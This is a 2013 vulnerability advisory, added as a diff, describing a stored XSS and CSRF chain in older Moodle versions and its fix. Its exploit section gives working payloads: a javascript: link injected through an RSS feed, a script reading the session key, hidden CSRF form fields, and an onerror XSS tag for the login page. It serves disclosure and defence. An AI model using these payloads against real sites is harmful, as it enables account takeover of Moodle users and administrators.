@@ -1,0 +1,98 @@
+#######################################################################
+
+                             Ciaran McNally
+
+Application:     Moodle 
+                 http://download.moodle.org/
+Versions:        <= 2.3.8, 2.4.5
+Platforms:       Windows, Mac, Linux
+Bug:             Persistant XSS / CSRF
+Exploitation:    WEB
+Date:            9 September 2013.
+Author:          Ciaran McNally
+Web:             http://makthepla.net/blog/=/moodle-2-account-takeover
+My Twitter:		 https://twitter.com/ciaranmak
+
+#######################################################################
+
+1) Bug.
+2) The exploit.
+3) Fix.
+
+#######################################################################
+Moodle is a Course Management System (CMS), also known as a Learning 
+Management System (LMS) or a Virtual Learning Environment (VLE). 
+It is a Free web application that educators can use to create effective 
+online learning sites.
+#######################################################################
+
+======
+1) Bug
+======
+At the following URL as a student,
+
+http://server/blog/external_blog_edit.php
+
+It is possible to remotely add an rss blog. The <link> parameter in an
+rss feed is vulnerable to javascript injection. 
+This blog post is viewable by everyone on moodle and you can link to it
+directly. Upon clicking the "Link to original blog entry" link, you
+get javascript execution.
+
+In moodle the "sesskey" parameter holds the session key used to prevent
+csrf, this isn't unique for every form once logged in so many forms can 
+be submitted using this item. It is available on every page which makes 
+xss quite dangerous in this case.
+
+#######################################################################
+
+==============
+2) The exploit
+==============
+
+Using a link value of <link>javascript:prompt(document.domain);</link>
+This will display a demonstrative prompt as expected.
+
+For a live example you can remotely include my blog rss feed.
+http://makthepla.net/Rss/
+My moodle blog post has a <link> value of the following.
+javascript:alert("Session key = "+M.cfg.sesskey+"\nUser ID = "+window.location.search.split("=")[1]);
+
+This displays the session key and the current users id.
+
+
+If you can get an admin to click the link and submit the following form
+trough javascript, you can post xss onto the main login page of your
+victim moodle site.
+
+<input type="hidden" name="id" value="1">
+<input type="hidden" name="sr" value="0">
+<input type="hidden" name="sesskey" value="x">
+<input type="hidden" name="_qf__editsection_form" value="1">
+<input type="hidden" name="mform_isexpanded_id_generalhdr" value="1">
+<input type="hidden" name="userdefaultname" value="1">
+<input type="hidden" name="summary_editor[text]" value="THE FRONT PAGE DATA AND/OR XSS">
+<input type="hidden" name="summary_editor[format]" value="1">
+<input type="hidden" name="summary_editor[itemid]" value="">
+<input type="hidden" name="submitbutton" value="Save+changes">
+
+You can read more about this on the original blog post. 
+You can get xss on the main login easily using html such as 
+<img src=x onerror=XSS> when posting as an admin via csrf.
+
+
+#######################################################################
+
+======
+3) Fix
+======
+
+https://tracker.moodle.org/browse/MDL-41623
+(This requires a login to view)
+
+Upgrade to versions 2.3.9, 2.4.6 and 2.5.2.
+
+#######################################################################
+
+--
+maK :)
